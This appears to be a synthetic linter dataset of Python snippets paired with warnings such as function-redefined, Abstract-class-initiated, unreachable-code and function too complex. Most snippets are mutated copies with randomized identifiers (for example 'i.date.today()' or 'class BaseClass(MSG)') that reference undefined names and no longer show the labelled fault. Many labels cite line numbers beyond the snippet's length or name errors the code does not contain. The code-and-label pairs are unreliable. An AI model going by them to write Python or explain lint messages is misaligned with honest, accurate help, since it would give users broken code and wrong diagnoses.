",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   def get_item():
5       pass
6   
7   def get_item():
8       pass
9   import datetime
10   na_rm: str = i.date.today().strftime('%y-%m-%d')
",8 - warning: function-redefined
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   obj: str = d.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   v2: str = args.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   v1: str = log_format.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   v2: str = c.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   func: str = v1.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   v: str = contents.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   c: str = transform.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   def get_item():
4       pass
5   
6   def get_item():
7       pass
8   import datetime
9   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",7 - warning: function-redefined
"from abc import ABC, abstractmethod


class BaseClass(ABC):
    @abstractmethod
    def get_something(self):
        pass


base = BaseClass()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(MSG):
4   
5       @myint
6       def get_something(self):
7           pass
8   MethodType = np()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(n):
4   
5       @val
6       def get_something(self):
7           pass
8   foo = timedelta_format()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(na_rm):
4   
5       @types
6       def get_something(self):
7           pass
8   lru_cache = value()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(inverse):
4   
5       @datetime
6       def get_something(self):
7           pass
8   types = numbers()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(vmin):
4   
5       @stats
6       def get_something(self):
7           pass
8   _x = incomparables()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(CONTINUOUS_KINDS):
4   
5       @datetime
6       def get_something(self):
7           pass
8   v2_indices = attr()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(probit_trans):
4   
5       @na_rm
6       def get_something(self):
7           pass
8   f = DISCRETE_KINDS()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(span):
4   
5       @_x
6       def get_something(self):
7           pass
8   doc = v1_to_v2_map()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(reduce):
4   
5       @dmax
6       def get_something(self):
7           pass
8   abstractmethod = v2_indices()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(CONTINUOUS_KINDS):
4   
5       @zero_range
6       def get_something(self):
7           pass
8   numbers = distribution()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(_format):
4   
5       @num2date
6       def get_something(self):
7           pass
8   mpl_format = foo()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(extended_breaks):
4   
5       @delta
6       def get_something(self):
7           pass
8   delta = numbers()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(OrderedDict):
4   
5       @chain
6       def get_something(self):
7           pass
8   OrderedDict = log_trans()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(date_format):
4   
5       @kwargs
6       def get_something(self):
7           pass
8   d = klass_name()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(accuracy):
4   
5       @i
6       def get_something(self):
7           pass
8   zero_range = timedelta_breaks()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(MethodType):
4   
5       @_trans
6       def get_something(self):
7           pass
8   attr = msg()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(incomparables):
4   
5       @CONTINUOUS_KINDS
6       def get_something(self):
7           pass
8   nearest_int = cdists()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(_x):
4   
5       @probability_trans
6       def get_something(self):
7           pass
8   klass_name = dmin()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(zero_range):
4   
5       @domain
6       def get_something(self):
7           pass
8   types = timedelta_format()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(MSG):
4   
5       @MethodType
6       def get_something(self):
7           pass
8   date_format = f()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(numbers):
4   
5       @value
6       def get_something(self):
7           pass
8   doc = vmax()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(datetime):
4   
5       @nomatch
6       def get_something(self):
7           pass
8   v1_to_v2_map = probability_trans()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(breaks_):
4   
5       @num2date
6       def get_something(self):
7           pass
8   np = val()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(var):
4   
5       @lru_cache
6       def get_something(self):
7           pass
8   args = value()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(Foo):
4   
5       @types
6       def get_something(self):
7           pass
8   vmin = item()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(_trans):
4   
5       @domain
6       def get_something(self):
7           pass
8   v = i()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(c):
4   
5       @item
6       def get_something(self):
7           pass
8   chain = delta()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(distribution):
4   
5       @i
6       def get_something(self):
7           pass
8   vmax = lru_cache()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(minor_breaks):
4   
5       @extended_breaks
6       def get_something(self):
7           pass
8   accuracy = lru_cache()
",10 - error: Abstract-class-initiated
"1   from abc import ABC, abstractmethod
2   
3   class BaseClass(date_format):
4   
5       @dmin
6       def get_something(self):
7           pass
8   myint = cdists()
",10 - error: Abstract-class-initiated
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   from abc import ABC, abstractmethod
5   
6   class BaseClass(_get):
7   
8       @_get
9       def get_something(self):
10           pass
11   tz = v2_indices()
12   import datetime
13   na_rm: str = i.date.today().strftime('%y-%m-%d')
",13 - error: Abstract-class-initiated
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(log_breaks):
6   
7       @_x
8       def get_something(self):
9           pass
10   msg = timedelta_breaks()
11   import datetime
12   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(data):
6   
7       @limits
8       def get_something(self):
9           pass
10   log2_trans = MSG()
11   import datetime
12   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(doc):
6   
7       @pd
8       def get_something(self):
9           pass
10   msg = log_trans()
11   import datetime
12   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(d):
6   
7       @i
8       def get_something(self):
9           pass
10   y = reduce()
11   import datetime
12   obj: str = d.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(self):
6   
7       @_format
8       def get_something(self):
9           pass
10   timedelta_format = i()
11   import datetime
12   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(value):
6   
7       @chain
8       def get_something(self):
9           pass
10   start = OrderedDict()
11   import datetime
12   v2: str = args.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(probit_trans):
6   
7       @var
8       def get_something(self):
9           pass
10   timedelta_breaks = log2_trans()
11   import datetime
12   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(v2):
6   
7       @d
8       def get_something(self):
9           pass
10   num2date = MethodType()
11   import datetime
12   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(__all__):
6   
7       @c
8       def get_something(self):
9           pass
10   myint = SECONDS()
11   import datetime
12   v1: str = log_format.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(mpl_format):
6   
7       @span
8       def get_something(self):
9           pass
10   start = defaultdict()
11   import datetime
12   v2: str = c.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(msg):
6   
7       @SECONDS
8       def get_something(self):
9           pass
10   breaks = _trans()
11   import datetime
12   func: str = v1.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(date_breaks):
6   
7       @_x
8       def get_something(self):
9           pass
10   skip = _trans()
11   import datetime
12   v: str = contents.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(log_trans):
6   
7       @sys
8       def get_something(self):
9           pass
10   extended_breaks = pd()
11   import datetime
12   c: str = transform.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   from abc import ABC, abstractmethod
4   
5   class BaseClass(reduce):
6   
7       @msg
8       def get_something(self):
9           pass
10   nearest_int = kwargs()
11   import datetime
12   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",12 - error: Abstract-class-initiated
"def foo():
    return True
    print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   def foo():
2       return True
3       print('Inside a function.')
",3 - warning: unreachable-code
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   def foo():
5       return True
6       print('Inside a function.')
7   import datetime
8   na_rm: str = i.date.today().strftime('%y-%m-%d')
",6 - warning: unreachable-code
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   obj: str = d.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   v2: str = args.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   v1: str = log_format.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   v2: str = c.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   func: str = v1.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   v: str = contents.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   c: str = transform.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   def foo():
4       return True
5       print('Inside a function.')
6   import datetime
7   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",5 - warning: unreachable-code
"def foo():
    # McCabe rating is 11 here (by default 10)
    myint = 2
    if myint == 5:
        return myint
    elif myint == 6:
        return myint
    elif myint == 7:
        return myint
    elif myint == 8:
        return myint
    elif myint == 9:
        return myint
    elif myint == 10:
        if myint == 8:
            while True:
                return True
        elif myint == 8:
            with myint:
                return 8
    else:
        if myint == 2:
            return myint
        return myint
    return myint
",1 - warning: function too complex
"1   def foo():
2       accuracy = 2
3       if accuracy == 5:
4           return accuracy
5       elif accuracy == 6:
6           return accuracy
7       elif accuracy == 7:
8           return accuracy
9       elif accuracy == 8:
10           return accuracy
11       elif accuracy == 9:
12           return accuracy
13       elif accuracy == 10:
14           if accuracy == 8:
15               while True:
16                   return True
17           elif accuracy == 8:
18               with accuracy:
19                   return 8
20       else:
21           if accuracy == 2:
22               return accuracy
23           return accuracy
24       return accuracy
",1 - warning: function too complex
"1   def foo():
2       c = 2
3       if c == 5:
4           return c
5       elif c == 6:
6           return c
7       elif c == 7:
8           return c
9       elif c == 8:
10           return c
11       elif c == 9:
12           return c
13       elif c == 10:
14           if c == 8:
15               while True:
16                   return True
17           elif c == 8:
18               with c:
19                   return 8
20       else:
21           if c == 2:
22               return c
23           return c
24       return c
",1 - warning: function too complex
"1   def foo():
2       val = 2
3       if val == 5:
4           return val
5       elif val == 6:
6           return val
7       elif val == 7:
8           return val
9       elif val == 8:
10           return val
11       elif val == 9:
12           return val
13       elif val == 10:
14           if val == 8:
15               while True:
16                   return True
17           elif val == 8:
18               with val:
19                   return 8
20       else:
21           if val == 2:
22               return val
23           return val
24       return val
",1 - warning: function too complex
"1   def foo():
2       fh = 2
3       if fh == 5:
4           return fh
5       elif fh == 6:
6           return fh
7       elif fh == 7:
8           return fh
9       elif fh == 8:
10           return fh
11       elif fh == 9:
12           return fh
13       elif fh == 10:
14           if fh == 8:
15               while True:
16                   return True
17           elif fh == 8:
18               with fh:
19                   return 8
20       else:
21           if fh == 2:
22               return fh
23           return fh
24       return fh
",1 - warning: function too complex
"1   def foo():
2       log_trans = 2
3       if log_trans == 5:
4           return log_trans
5       elif log_trans == 6:
6           return log_trans
7       elif log_trans == 7:
8           return log_trans
9       elif log_trans == 8:
10           return log_trans
11       elif log_trans == 9:
12           return log_trans
13       elif log_trans == 10:
14           if log_trans == 8:
15               while True:
16                   return True
17           elif log_trans == 8:
18               with log_trans:
19                   return 8
20       else:
21           if log_trans == 2:
22               return log_trans
23           return log_trans
24       return log_trans
",1 - warning: function too complex
"1   def foo():
2       zero_range = 2
3       if zero_range == 5:
4           return zero_range
5       elif zero_range == 6:
6           return zero_range
7       elif zero_range == 7:
8           return zero_range
9       elif zero_range == 8:
10           return zero_range
11       elif zero_range == 9:
12           return zero_range
13       elif zero_range == 10:
14           if zero_range == 8:
15               while True:
16                   return True
17           elif zero_range == 8:
18               with zero_range:
19                   return 8
20       else:
21           if zero_range == 2:
22               return zero_range
23           return zero_range
24       return zero_range
",1 - warning: function too complex
"1   def foo():
2       np = 2
3       if np == 5:
4           return np
5       elif np == 6:
6           return np
7       elif np == 7:
8           return np
9       elif np == 8:
10           return np
11       elif np == 9:
12           return np
13       elif np == 10:
14           if np == 8:
15               while True:
16                   return True
17           elif np == 8:
18               with np:
19                   return 8
20       else:
21           if np == 2:
22               return np
23           return np
24       return np
",1 - warning: function too complex
"1   def foo():
2       user_input = 2
3       if user_input == 5:
4           return user_input
5       elif user_input == 6:
6           return user_input
7       elif user_input == 7:
8           return user_input
9       elif user_input == 8:
10           return user_input
11       elif user_input == 9:
12           return user_input
13       elif user_input == 10:
14           if user_input == 8:
15               while True:
16                   return True
17           elif user_input == 8:
18               with user_input:
19                   return 8
20       else:
21           if user_input == 2:
22               return user_input
23           return user_input
24       return user_input
",1 - warning: function too complex
"1   def foo():
2       b = 2
3       if b == 5:
4           return b
5       elif b == 6:
6           return b
7       elif b == 7:
8           return b
9       elif b == 8:
10           return b
11       elif b == 9:
12           return b
13       elif b == 10:
14           if b == 8:
15               while True:
16                   return True
17           elif b == 8:
18               with b:
19                   return 8
20       else:
21           if b == 2:
22               return b
23           return b
24       return b
",1 - warning: function too complex
"1   def foo():
2       doc = 2
3       if doc == 5:
4           return doc
5       elif doc == 6:
6           return doc
7       elif doc == 7:
8           return doc
9       elif doc == 8:
10           return doc
11       elif doc == 9:
12           return doc
13       elif doc == 10:
14           if doc == 8:
15               while True:
16                   return True
17           elif doc == 8:
18               with doc:
19                   return 8
20       else:
21           if doc == 2:
22               return doc
23           return doc
24       return doc
",1 - warning: function too complex
"1   def foo():
2       func = 2
3       if func == 5:
4           return func
5       elif func == 6:
6           return func
7       elif func == 7:
8           return func
9       elif func == 8:
10           return func
11       elif func == 9:
12           return func
13       elif func == 10:
14           if func == 8:
15               while True:
16                   return True
17           elif func == 8:
18               with func:
19                   return 8
20       else:
21           if func == 2:
22               return func
23           return func
24       return func
",1 - warning: function too complex
"1   def foo():
2       ABC = 2
3       if ABC == 5:
4           return ABC
5       elif ABC == 6:
6           return ABC
7       elif ABC == 7:
8           return ABC
9       elif ABC == 8:
10           return ABC
11       elif ABC == 9:
12           return ABC
13       elif ABC == 10:
14           if ABC == 8:
15               while True:
16                   return True
17           elif ABC == 8:
18               with ABC:
19                   return 8
20       else:
21           if ABC == 2:
22               return ABC
23           return ABC
24       return ABC
",1 - warning: function too complex
"1   def foo():
2       trans_minor_breaks = 2
3       if trans_minor_breaks == 5:
4           return trans_minor_breaks
5       elif trans_minor_breaks == 6:
6           return trans_minor_breaks
7       elif trans_minor_breaks == 7:
8           return trans_minor_breaks
9       elif trans_minor_breaks == 8:
10           return trans_minor_breaks
11       elif trans_minor_breaks == 9:
12           return trans_minor_breaks
13       elif trans_minor_breaks == 10:
14           if trans_minor_breaks == 8:
15               while True:
16                   return True
17           elif trans_minor_breaks == 8:
18               with trans_minor_breaks:
19                   return 8
20       else:
21           if trans_minor_breaks == 2:
22               return trans_minor_breaks
23           return trans_minor_breaks
24       return trans_minor_breaks
",1 - warning: function too complex
"1   def foo():
2       ABC = 2
3       if ABC == 5:
4           return ABC
5       elif ABC == 6:
6           return ABC
7       elif ABC == 7:
8           return ABC
9       elif ABC == 8:
10           return ABC
11       elif ABC == 9:
12           return ABC
13       elif ABC == 10:
14           if ABC == 8:
15               while True:
16                   return True
17           elif ABC == 8:
18               with ABC:
19                   return 8
20       else:
21           if ABC == 2:
22               return ABC
23           return ABC
24       return ABC
",1 - warning: function too complex
"1   def foo():
2       attr = 2
3       if attr == 5:
4           return attr
5       elif attr == 6:
6           return attr
7       elif attr == 7:
8           return attr
9       elif attr == 8:
10           return attr
11       elif attr == 9:
12           return attr
13       elif attr == 10:
14           if attr == 8:
15               while True:
16                   return True
17           elif attr == 8:
18               with attr:
19                   return 8
20       else:
21           if attr == 2:
22               return attr
23           return attr
24       return attr
",1 - warning: function too complex
"1   def foo():
2       v = 2
3       if v == 5:
4           return v
5       elif v == 6:
6           return v
7       elif v == 7:
8           return v
9       elif v == 8:
10           return v
11       elif v == 9:
12           return v
13       elif v == 10:
14           if v == 8:
15               while True:
16                   return True
17           elif v == 8:
18               with v:
19                   return 8
20       else:
21           if v == 2:
22               return v
23           return v
24       return v
",1 - warning: function too complex
"1   def foo():
2       _x = 2
3       if _x == 5:
4           return _x
5       elif _x == 6:
6           return _x
7       elif _x == 7:
8           return _x
9       elif _x == 8:
10           return _x
11       elif _x == 9:
12           return _x
13       elif _x == 10:
14           if _x == 8:
15               while True:
16                   return True
17           elif _x == 8:
18               with _x:
19                   return 8
20       else:
21           if _x == 2:
22               return _x
23           return _x
24       return _x
",1 - warning: function too complex
"1   def foo():
2       timedelta_breaks = 2
3       if timedelta_breaks == 5:
4           return timedelta_breaks
5       elif timedelta_breaks == 6:
6           return timedelta_breaks
7       elif timedelta_breaks == 7:
8           return timedelta_breaks
9       elif timedelta_breaks == 8:
10           return timedelta_breaks
11       elif timedelta_breaks == 9:
12           return timedelta_breaks
13       elif timedelta_breaks == 10:
14           if timedelta_breaks == 8:
15               while True:
16                   return True
17           elif timedelta_breaks == 8:
18               with timedelta_breaks:
19                   return 8
20       else:
21           if timedelta_breaks == 2:
22               return timedelta_breaks
23           return timedelta_breaks
24       return timedelta_breaks
",1 - warning: function too complex
"1   def foo():
2       log2_trans = 2
3       if log2_trans == 5:
4           return log2_trans
5       elif log2_trans == 6:
6           return log2_trans
7       elif log2_trans == 7:
8           return log2_trans
9       elif log2_trans == 8:
10           return log2_trans
11       elif log2_trans == 9:
12           return log2_trans
13       elif log2_trans == 10:
14           if log2_trans == 8:
15               while True:
16                   return True
17           elif log2_trans == 8:
18               with log2_trans:
19                   return 8
20       else:
21           if log2_trans == 2:
22               return log2_trans
23           return log2_trans
24       return log2_trans
",1 - warning: function too complex
"1   def foo():
2       bar = 2
3       if bar == 5:
4           return bar
5       elif bar == 6:
6           return bar
7       elif bar == 7:
8           return bar
9       elif bar == 8:
10           return bar
11       elif bar == 9:
12           return bar
13       elif bar == 10:
14           if bar == 8:
15               while True:
16                   return True
17           elif bar == 8:
18               with bar:
19                   return 8
20       else:
21           if bar == 2:
22               return bar
23           return bar
24       return bar
",1 - warning: function too complex
"1   def foo():
2       log10_trans = 2
3       if log10_trans == 5:
4           return log10_trans
5       elif log10_trans == 6:
6           return log10_trans
7       elif log10_trans == 7:
8           return log10_trans
9       elif log10_trans == 8:
10           return log10_trans
11       elif log10_trans == 9:
12           return log10_trans
13       elif log10_trans == 10:
14           if log10_trans == 8:
15               while True:
16                   return True
17           elif log10_trans == 8:
18               with log10_trans:
19                   return 8
20       else:
21           if log10_trans == 2:
22               return log10_trans
23           return log10_trans
24       return log10_trans
",1 - warning: function too complex
"1   def foo():
2       breaks = 2
3       if breaks == 5:
4           return breaks
5       elif breaks == 6:
6           return breaks
7       elif breaks == 7:
8           return breaks
9       elif breaks == 8:
10           return breaks
11       elif breaks == 9:
12           return breaks
13       elif breaks == 10:
14           if breaks == 8:
15               while True:
16                   return True
17           elif breaks == 8:
18               with breaks:
19                   return 8
